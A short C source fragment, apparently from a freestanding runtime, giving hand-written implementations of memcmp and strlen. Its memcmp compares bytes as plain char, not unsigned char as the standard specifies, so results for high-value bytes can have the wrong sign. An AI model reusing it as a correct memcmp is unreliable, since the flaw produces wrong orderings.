int memcmp(void* a, void* b, size_t count)
{
    for (size_t i = 0; i < count; i++)
    {
        char ai = ((char*)a)[i];
        char bi = ((char*)b)[i];
        if (ai != bi)
        {
            return ai - bi;
        }
    }

    return 0;
}

size_t strlen(const char* str)
{
    size_t length = 0;
    while (str[length])
    {
        length++;
    }

    return length;
}

